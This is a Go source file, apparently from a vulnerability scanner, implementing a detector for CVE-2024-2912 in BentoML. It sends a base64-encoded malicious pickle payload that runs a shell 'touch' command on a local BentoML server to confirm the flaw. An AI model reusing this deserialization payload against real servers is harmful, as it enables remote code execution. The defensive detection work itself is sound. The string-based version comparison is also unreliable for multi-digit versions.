// Copyright 2025 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//      http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

// Package cve20242912 implements a detector for CVE-2024-2912.
// To test this detector locally, install a vulnerable version of BentoML and its dependencies.
// python3 -m venv bentoml_env; source bentoml_env/bin/activate;
// pip install transformers==4.37.2; pip install torch==2.2.0; pip install pydantic==2.6.1; pip install bentoml==1.2.2;
//
// Once installed, create a service.py file as shown in the documentation: https://github.com/bentoml/quickstart/blob/main/service.py
// Serve the application using the following command:
// bentoml serve service:Summarization
package cve20242912

import (
	"bytes"
	"context"
	"encoding/base64"
	"fmt"
	"io/fs"
	"net"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"

	"github.com/google/osv-scalibr/detector"
	"github.com/google/osv-scalibr/extractor"
	"github.com/google/osv-scalibr/extractor/filesystem/language/python/wheelegg"
	scalibrfs "github.com/google/osv-scalibr/fs"
	"github.com/google/osv-scalibr/inventory"
	"github.com/google/osv-scalibr/log"
	"github.com/google/osv-scalibr/packageindex"
	"github.com/google/osv-scalibr/plugin"
	"github.com/ossf/osv-schema/bindings/go/osvschema"
)

type bentomlPackageNames struct {
	packageType  string
	name         string
	fixedVersion string
}

const (
	// Name of the detector.
	Name = "cve/cve-2024-2912"

	payloadPath       = "/tmp/bentoml-poc-CVE-2024-2912"
	bentomlServerPort = 3000
	defaultTimeout    = 5 * time.Second
	schedulerTimeout  = 40 * time.Second
	bentomlServerIP   = "127.0.0.1"
)

var (
	// Base64 encoded payload b'\x80\x04\x95?\x00\x00\x00\x00\x00\x00\x00\x8c\x05posix\x94\x8c\x06system\x94\x93\x94\x8c$touch /tmp/bentoml-poc-CVE-2024-2912\x94\x85\x94R\x94.'
	pickledPayload  = []byte("gASVPwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCR0b3VjaCAvdG1wL2JlbnRvbWwtcG9jLUNWRS0yMDI0LTI5MTKUhZRSlC4=")
	bentomlPackages = []bentomlPackageNames{
		{
			packageType:  "pypi",
			name:         "bentoml",
			fixedVersion: "1.2.5",
		},
	}
)

// Detector is a SCALIBR Detector for CVE-2024-2912.
type Detector struct{}

// New returns a detector.
func New() detector.Detector {
	return &Detector{}
}

// Name of the detector.
func (Detector) Name() string { return Name }

// Version of the detector.
func (Detector) Version() int { return 0 }

// Requirements of the detector.
func (Detector) Requirements() *plugin.Capabilities {
	return &plugin.Capabilities{DirectFS: true, RunningSystem: true, OS: plugin.OSLinux}
}

// RequiredExtractors returns an empty list as there are no dependencies.
func (Detector) RequiredExtractors() []string { return []string{wheelegg.Name} }

// DetectedFinding returns generic vulnerability information about what is detected.
func (d Detector) DetectedFinding() inventory.Finding {
	return d.findingForPackage(nil)
}

func (Detector) findingForPackage(dbSpecific map[string]any) inventory.Finding {
	pkg := &extractor.Package{
		Name:     "bentoml",
		PURLType: "pypi",
	}
	return inventory.Finding{PackageVulns: []*inventory.PackageVuln{{
		Vulnerability: osvschema.Vulnerability{
			ID:      "CVE-2024-2912",
			Summary: "CVE-2024-2912",
			Details: "CVE-2024-2912",
			Affected: inventory.PackageToAffected(pkg, "1.2.5", &osvschema.Severity{
				Type:  osvschema.SeverityCVSSV3,
				Score: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H",
			}),
			DatabaseSpecific: dbSpecific,
		},
	}}}
}

func findBentomlVersions(px *packageindex.PackageIndex) (string, *extractor.Package, string) {
	for _, r := range bentomlPackages {
		pkg := px.GetSpecific(r.name, r.packageType)
		if len(pkg) > 0 {
			p := pkg[0]
			return p.Version, p, r.fixedVersion
		}
	}
	return "", nil, ""
}

// CheckAccessibility checks if the BentoML server is reachable
func CheckAccessibility(ctx context.Context, ip string, port int) bool {
	target := fmt.Sprintf("http://%s/summarize", net.JoinHostPort(ip, strconv.Itoa(port)))

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, target, nil)
	if err != nil {
		log.Infof("Error creating request: %v", err)
		return false
	}

	client := &http.Client{Timeout: defaultTimeout}
	resp, err := client.Do(req)
	if err != nil {
		log.Infof("Request failed: %v", err)
		return false
	}
	defer resp.Body.Close()
	return true
}

// ExploitBentoml sends payload to the BentoML service
func ExploitBentoml(ctx context.Context, ip string, port int) bool {
	target := fmt.Sprintf("http://%s/summarize", net.JoinHostPort(ip, strconv.Itoa(port)))

	payload, err := base64.StdEncoding.DecodeString(string(pickledPayload))
	if err != nil {
		log.Infof("Payload decode failed: %v", err)
		return false
	}

	ctx, cancel := context.WithTimeout(ctx, defaultTimeout)
	defer cancel()

	req, err := http.NewRequestWithContext(ctx, http.MethodPost, target, bytes.NewBuffer(payload))
	if err != nil {
		log.Infof("Error creating request: %v", err)
		return false
	}
	req.Header.Set("Content-Type", "application/vnd.bentoml+pickle")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Infof("Error sending request: %v\n", err)
		return false
	}
	defer resp.Body.Close()

	// The payload is expected to trigger a 400 Bad Request status code
	if resp.StatusCode != http.StatusBadRequest {
		log.Infof("Unexpected status code: %d\n", resp.StatusCode)
		return false
	}

	return true
}

func fileExists(filesys scalibrfs.FS, path string) bool {
	_, err := fs.Stat(filesys, path)
	return !os.IsNotExist(err)
}

// Scan checks for the presence of the BentoML CVE-2024-2912 vulnerability on the filesystem.
func (d Detector) Scan(ctx context.Context, scanRoot *scalibrfs.ScanRoot, px *packageindex.PackageIndex) (inventory.Finding, error) {
	bentomlVersion, pkg, fixedVersion := findBentomlVersions(px)
	if bentomlVersion == "" {
		log.Debugf("No BentoML version found")
		return inventory.Finding{}, nil
	}

	bv := strings.Split(strings.TrimLeft(strings.ToLower(bentomlVersion), "v"), ".")
	fbv := strings.Split(fixedVersion, ".")
	if len(bv) < 3 {
		log.Infof("Unable to parse version: %q", bentomlVersion)
		return inventory.Finding{}, nil
	}

	// Check if the installed version is lower than the fixed.
	isVulnVersion := false
	if bv[0] < fbv[0] {
		isVulnVersion = true
	} else if bv[0] == fbv[0] && bv[1] < fbv[1] {
		isVulnVersion = true
	} else if bv[0] == fbv[0] && bv[1] == fbv[1] && bv[2] < fbv[2] {
		isVulnVersion = true
	}

	if !isVulnVersion {
		log.Infof("Version not vulnerable: %q", bentomlVersion)
		return inventory.Finding{}, nil
	}

	log.Infof("Version is potentially vulnerable: %q", bentomlVersion)

	if !CheckAccessibility(ctx, bentomlServerIP, bentomlServerPort) {
		log.Infof("BentoML server not accessible")
		return inventory.Finding{}, nil
	}

	if !ExploitBentoml(ctx, bentomlServerIP, bentomlServerPort) {
		log.Infof("BentoML exploit unsuccessful")
		return inventory.Finding{}, nil
	}

	log.Infof("Exploit complete")

	if !fileExists(scanRoot.FS, payloadPath) {
		log.Infof("No POC file detected")
		return inventory.Finding{}, nil
	}

	log.Infof("BentoML version %q vulnerable", bentomlVersion)

	err := os.Remove(payloadPath)
	if err != nil {
		log.Infof("Error removing file: %v", err)
	}
	log.Infof("Payload file removed")

	dbSpecific := map[string]any{
		"extra": fmt.Sprintf("%s %s %s", pkg.Name, pkg.Version, strings.Join(pkg.Locations, ", ")),
	}
	return d.findingForPackage(dbSpecific), nil
}
